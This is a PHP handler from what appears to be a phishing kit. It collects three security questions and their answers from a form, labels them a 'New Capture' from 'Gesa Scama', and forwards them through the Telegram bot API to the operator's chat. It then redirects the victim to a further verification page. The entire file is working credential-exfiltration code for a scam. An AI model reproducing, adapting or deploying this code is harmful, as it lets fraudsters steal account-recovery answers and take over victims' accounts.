<?php
error_reporting(E_ERROR | E_PARSE);

include "config.php";

if (isset($_POST['q1'])){

$msg = "
𝗡𝗲𝘄 𝗖𝗮𝗽𝘁𝘂𝗿𝗲 ✅

━━━━━━━━━━━━━━━━━━━━━━━━
Security Question 1: {$_POST['q1']}
Security Answer 1: {$_POST['a1']}

Security Question 2: {$_POST['q2']}
Security Answer 2: {$_POST['a2']}

Security Question 3: {$_POST['q3']}
Security Answer 3: {$_POST['a3']}
━━━━━━━━━━━━━━━━━━━━━━━━

Sent From Gesa Scama
";

    // Data to send in the POST request
    $data = [
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $msg
    ];

    // Initialize cURL session
    $ch = curl_init("https://api.telegram.org/bot{$TELEGRAM_API_KEY}/sendMessage?parse_mode=html");

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute cURL session and store the response
    if(curl_exec($ch)){
        header('Location: verify1.php');
    } else {
    }

    curl_close($ch);
}
?>